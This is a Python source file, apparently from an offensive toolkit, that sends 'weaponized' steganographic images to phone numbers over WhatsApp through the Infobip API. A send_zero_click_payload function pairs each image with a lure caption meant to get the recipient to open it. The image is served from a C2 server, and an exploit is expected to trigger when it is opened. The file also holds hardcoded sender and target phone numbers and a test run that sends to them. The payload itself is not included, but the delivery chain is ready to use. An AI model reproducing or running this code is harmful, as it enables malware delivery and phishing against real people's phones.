#!/usr/bin/env python3
"""
Infobip WhatsApp Sender Module
Sends weaponized payloads via WhatsApp using Infobip API
"""

import os
import json
import logging
import http.client
import base64
from datetime import datetime
from typing import Dict, Optional
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class InfobipWhatsAppSender:
    """
    Handles sending weaponized payloads via WhatsApp using Infobip API
    """

    def __init__(self):
        # Load Infobip credentials from environment
        self.api_key = os.getenv('INFOBIP_API_KEY', '')
        self.base_url = os.getenv('INFOBIP_BASE_URL', 'g9vm5e.api.infobip.com')
        self.sender_number = os.getenv('INFOBIP_SENDER_NUMBER', '447860088970')
        self.template_name = os.getenv('INFOBIP_TEMPLATE_NAME', 'test_whatsapp_template_en')
        self.template_language = os.getenv('INFOBIP_TEMPLATE_LANGUAGE', 'en')

        self.demo_mode = os.getenv('DEMO_MODE', 'true').lower() == 'true'

        if not self.api_key:
            logger.warning("⚠️  Infobip API key not configured")

        logger.info("Infobip WhatsApp Sender initialized")
        logger.info(f"Demo Mode: {self.demo_mode}")
        logger.info(f"Sender: {self.sender_number}")

    def send_text_message(self,
                         target_phone: str,
                         message_text: str,
                         message_id: Optional[str] = None) -> Dict:
        """
        Send a text WhatsApp message using Infobip API

        Args:
            target_phone: Target's phone number (e.g., +447575960046)
            message_text: Message content
            message_id: Optional custom message ID

        Returns:
            Dict with success status and response
        """
        try:
            # Clean phone number
            target_phone = target_phone.replace('+', '').replace('-', '').replace(' ', '')

            if not message_id:
                message_id = f"msg_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"

            # Demo mode simulation
            if self.demo_mode:
                logger.info(f"[DEMO MODE] Would send WhatsApp message to {target_phone}")
                return {
                    'success': True,
                    'demo_mode': True,
                    'message': 'Message sent (demo mode)',
                    'to': target_phone,
                    'from': self.sender_number,
                    'message_id': message_id,
                    'message_text': message_text
                }

            # Production mode - actual API call
            conn = http.client.HTTPSConnection(self.base_url)

            payload = json.dumps({
                "from": self.sender_number,
                "to": target_phone,
                "content": {
                    "text": message_text
                }
            })

            headers = {
                'Authorization': f'App {self.api_key}',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }

            conn.request("POST", "/whatsapp/1/message/text", payload, headers)
            res = conn.getresponse()
            data = res.read()
            response_data = json.loads(data.decode("utf-8"))

            conn.close()

            logger.info(f"[WHATSAPP] Message sent to {target_phone}")
            logger.info(f"[WHATSAPP] Status: {res.status}")

            return {
                'success': res.status == 200,
                'demo_mode': False,
                'response': response_data,
                'to': target_phone,
                'from': self.sender_number,
                'message_id': message_id,
                'status_code': res.status
            }

        except Exception as e:
            logger.error(f"Error sending WhatsApp message: {e}")
            return {
                'success': False,
                'error': str(e),
                'to': target_phone
            }

    def send_media_message(self,
                          target_phone: str,
                          media_url: str,
                          caption: str = "",
                          message_id: Optional[str] = None) -> Dict:
        """
        Send a media message (image/document) via WhatsApp

        Args:
            target_phone: Target's phone number
            media_url: URL of the weaponized image/document
            caption: Optional caption text
            message_id: Optional custom message ID

        Returns:
            Dict with success status and response
        """
        try:
            target_phone = target_phone.replace('+', '').replace('-', '').replace(' ', '')

            if not message_id:
                message_id = f"media_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"

            # Demo mode simulation
            if self.demo_mode:
                logger.info(f"[DEMO MODE] Would send media to {target_phone}")
                return {
                    'success': True,
                    'demo_mode': True,
                    'message': 'Media message sent (demo mode)',
                    'to': target_phone,
                    'from': self.sender_number,
                    'message_id': message_id,
                    'media_url': media_url,
                    'caption': caption
                }

            # Production mode - actual API call
            conn = http.client.HTTPSConnection(self.base_url)

            payload = json.dumps({
                "from": self.sender_number,
                "to": target_phone,
                "content": {
                    "mediaUrl": media_url,
                    "caption": caption
                }
            })

            headers = {
                'Authorization': f'App {self.api_key}',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }

            conn.request("POST", "/whatsapp/1/message/image", payload, headers)
            res = conn.getresponse()
            data = res.read()
            response_data = json.loads(data.decode("utf-8"))

            conn.close()

            logger.info(f"[WHATSAPP MEDIA] Sent to {target_phone}")
            logger.info(f"[WHATSAPP MEDIA] URL: {media_url}")

            return {
                'success': res.status == 200,
                'demo_mode': False,
                'response': response_data,
                'to': target_phone,
                'from': self.sender_number,
                'message_id': message_id,
                'media_url': media_url,
                'status_code': res.status
            }

        except Exception as e:
            logger.error(f"Error sending media message: {e}")
            return {
                'success': False,
                'error': str(e),
                'to': target_phone
            }

    def send_template_message(self,
                             target_phone: str,
                             template_name: Optional[str] = None,
                             placeholders: list = None,
                             message_id: Optional[str] = None) -> Dict:
        """
        Send a template-based WhatsApp message

        Args:
            target_phone: Target's phone number
            template_name: WhatsApp template name (default from env)
            placeholders: List of placeholder values for template
            message_id: Optional custom message ID

        Returns:
            Dict with success status and response
        """
        try:
            target_phone = target_phone.replace('+', '').replace('-', '').replace(' ', '')

            if not template_name:
                template_name = self.template_name

            if not placeholders:
                placeholders = ["User"]

            if not message_id:
                message_id = f"tmpl_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"

            # Demo mode simulation
            if self.demo_mode:
                logger.info(f"[DEMO MODE] Would send template message to {target_phone}")
                return {
                    'success': True,
                    'demo_mode': True,
                    'message': 'Template message sent (demo mode)',
                    'to': target_phone,
                    'from': self.sender_number,
                    'message_id': message_id,
                    'template': template_name
                }

            # Production mode - actual API call (your original code)
            conn = http.client.HTTPSConnection(self.base_url)

            payload = json.dumps({
                "messages": [
                    {
                        "from": self.sender_number,
                        "to": target_phone,
                        "messageId": message_id,
                        "content": {
                            "templateName": template_name,
                            "templateData": {
                                "body": {
                                    "placeholders": placeholders
                                }
                            },
                            "language": self.template_language
                        }
                    }
                ]
            })

            headers = {
                'Authorization': f'App {self.api_key}',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }

            conn.request("POST", "/whatsapp/1/message/template", payload, headers)
            res = conn.getresponse()
            data = res.read()
            response_data = json.loads(data.decode("utf-8"))

            conn.close()

            logger.info(f"[WHATSAPP TEMPLATE] Sent to {target_phone}")
            logger.info(f"[WHATSAPP TEMPLATE] Template: {template_name}")

            return {
                'success': res.status == 200,
                'demo_mode': False,
                'response': response_data,
                'to': target_phone,
                'from': self.sender_number,
                'message_id': message_id,
                'template': template_name,
                'status_code': res.status
            }

        except Exception as e:
            logger.error(f"Error sending template message: {e}")
            return {
                'success': False,
                'error': str(e),
                'to': target_phone
            }

    def send_zero_click_payload(self,
                                target_phone: str,
                                payload_filename: str,
                                social_engineering_message: str = None,
                                c2_server: str = "localhost") -> Dict:
        """
        Send zero-click exploit payload via WhatsApp

        Args:
            target_phone: Target's phone number
            payload_filename: Weaponized file name (in static/stego_outputs/)
            social_engineering_message: Custom message (or auto-generate)
            c2_server: C2 server address

        Returns:
            Dict with delivery status and details
        """
        try:
            # Generate social engineering message if not provided
            if not social_engineering_message:
                messages = [
                    "Hey! Check out this amazing photo! 📸",
                    "OMG you HAVE to see this! 😱",
                    "Look what I found! Is this you?? 😂",
                    "Thought you'd like this! Pretty cool right? 🔥"
                ]
                import random
                social_engineering_message = random.choice(messages)

            # Construct media URL
            # In production, this should be a publicly accessible URL
            if c2_server == "localhost":
                media_url = f"http://localhost:5008/static/stego_outputs/{payload_filename}"
            else:
                media_url = f"http://{c2_server}:5008/static/stego_outputs/{payload_filename}"

            logger.info(f"[ZERO-CLICK PAYLOAD] Preparing delivery to {target_phone}")
            logger.info(f"[ZERO-CLICK PAYLOAD] File: {payload_filename}")
            logger.info(f"[ZERO-CLICK PAYLOAD] Message: {social_engineering_message}")

            # Send weaponized image via WhatsApp
            result = self.send_media_message(
                target_phone=target_phone,
                media_url=media_url,
                caption=social_engineering_message
            )

            if result.get('success'):
                logger.info(f"[ZERO-CLICK PAYLOAD] ✅ Delivered to {target_phone}")
                logger.info(f"[ZERO-CLICK PAYLOAD] Target will auto-download media")
                logger.info(f"[ZERO-CLICK PAYLOAD] Exploit will trigger on image open")

                result['delivery_method'] = 'whatsapp'
                result['payload_file'] = payload_filename
                result['media_url'] = media_url
                result['auto_download'] = True
                result['expected_trigger'] = 'On image open in WhatsApp'
            else:
                logger.error(f"[ZERO-CLICK PAYLOAD] ❌ Failed to deliver to {target_phone}")

            return result

        except Exception as e:
            logger.error(f"Error sending zero-click payload: {e}")
            return {
                'success': False,
                'error': str(e),
                'to': target_phone,
                'payload_file': payload_filename
            }


if __name__ == '__main__':
    # Test the WhatsApp sender
    sender = InfobipWhatsAppSender()

    print("="*80)
    print("INFOBIP WHATSAPP SENDER TEST")
    print("="*80)

    # Test text message
    print("\n[TEST 1] Sending text message...")
    result = sender.send_text_message(
        target_phone="+447575960046",
        message_text="🔴 RED TEAM TEST: WhatsApp delivery operational"
    )
    print(f"Success: {result['success']}")
    print(f"Demo Mode: {result.get('demo_mode', False)}")

    # Test media message
    print("\n[TEST 2] Sending media message...")
    result = sender.send_media_message(
        target_phone="+447575960046",
        media_url="http://localhost:5008/static/stego_outputs/weaponized_social_media_image.png",
        caption="Check this out! 📸"
    )
    print(f"Success: {result['success']}")
    print(f"Demo Mode: {result.get('demo_mode', False)}")

    # Test zero-click payload delivery
    print("\n[TEST 3] Sending zero-click payload...")
    result = sender.send_zero_click_payload(
        target_phone="+447575960046",
        payload_filename="weaponized_social_media_image.png"
    )
    print(f"Success: {result['success']}")
    print(f"Delivery Method: {result.get('delivery_method')}")
    print(f"Auto-Download: {result.get('auto_download')}")
    print(f"Expected Trigger: {result.get('expected_trigger')}")

    print("\n" + "="*80)
